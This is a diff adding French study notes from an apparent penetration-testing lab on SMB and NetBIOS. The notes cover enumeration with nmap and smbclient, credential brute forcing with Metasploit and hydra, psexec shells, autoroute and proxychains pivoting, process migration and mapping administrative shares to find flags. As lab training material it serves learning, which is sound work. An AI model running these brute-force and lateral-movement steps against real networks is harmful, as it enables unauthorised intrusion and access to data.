@@ -10,6 +10,7 @@
 * ``auxiliary/scanner/smb/smb_login`` et renseigner les options, pour brute forcer les users/passwords.  
 * Une fois user/password récupérés, nous pouvons exécuter `exploit/windows/smb/psexec` et renseigner les bonnes infos (cible, user, password.) puis on lance l'exploit  
 * On obtient ensuite un meterpreter. ( `shell`...)  
+* On peut lancer aussi avec `psexec.py`  
   
 
 ## SMBCLIENT 
@@ -40,3 +41,47 @@ Si l'exploit fonctionne, nous obtenons un meterpreter.
 ## smbmap
 Permet de lister les partages
 `smbmap -H demo.ine.local -u admin -p password1`
+
+
+
+# SMB & NETBIOS
+
+`nbtscan` : Netbios enumération.  
+
+* `nmap -p445 --script smb-protocols IP_Target`: Pour connaître toutes les versions SMB prises en charge sur la machine cible  
+* `nmap -p445 --script smb-security-mode IP-Target` Permet ensuite de déterminer le niveau de sécurité de ce protocole  
+![alt text](<Images/Capture d'écran 2026-01-18 182123.png>)
+ * `smbclient -L IP_Target` : Permet de se connecter en anonymous si il est autorisé, sans mot de passe et de lister les partages disponibles.  
+ * `nmap -p445 --script smb-enum-users Target_IP` : Lister les users.  
+ Une fois les users trouvés, les rentrer dans un fichier texte, puis brute forcer avec hydra.  
+ * `exploit/windows/smb/psexec` : Permet de récupérer un shell.  
+ * Puis `run autoroute -s network/CIDR` : Permet d’accéder à un réseau interne via la machine compromise. `-s` précise le réseau à ajouter. `autoroute` ajoute une route réseau dans Metasploit.  
+👉 C’est du pivoting  
+* `background` permet de mettre la session en arrière plan et de revenir sur les modules de metasploit.  
+* `cat /etc/proxychains4.conf` Démarrer le serveur proxy socks pour accéder au système pivot sur la machine de l’attaquant à l’aide de l’outil proxychains. On constate que le port proxychain est 9050.  
+* Dans metasploit, `auxiliary/server/socks_proxy` : Utiliser ce module en réglant la version sur 4a et le SRVPORT sur 9050.  
+Maintenant, démarrons le serveur proxy socks pour accéder au système pivot sur la machine de l’attaquant à l’aide de l’outil proxychains.  
+* `proxychains nmap demo1.ine.local -sT -Pn -sV -p 445` :  
+  ``demo1.ine.local``: La machine à pivot
+
+``-sT``: Analyse de connexion TCP
+
+``-Pn`` Ignorer la découverte de l'hôte et forcer l'analyse des ports.
+
+``-sV``: Analyser les ports ouverts pour déterminer les informations de service/version
+
+``-p 445``: Définir le port à scanner
+
+Cette analyse est la méthode la plus sûre pour identifier les ports ouverts. Nous pourrions utiliser un module d'analyse de ports TCP auxiliaire, mais ces modules sont très intrusifs et peuvent interrompre votre session.  
+
+* On migre vers explorer.exe pour avoir le sprivilèges : `migrate -N explorer.exe`  
+* On retourne sur le meterpreter : `sessions -i 1`, `shell`, `net view IP_Target`, on voit les ressources partagées.  
+* On peut donc mapper les lecteurs :  
+   - net use D: \\10.0.28.125\Documents  
+   - net use K: \\10.0.28.125\K$  
+
+* Il ne rste plus qu'à se promener et regarder les flags.  
+
+
+
+
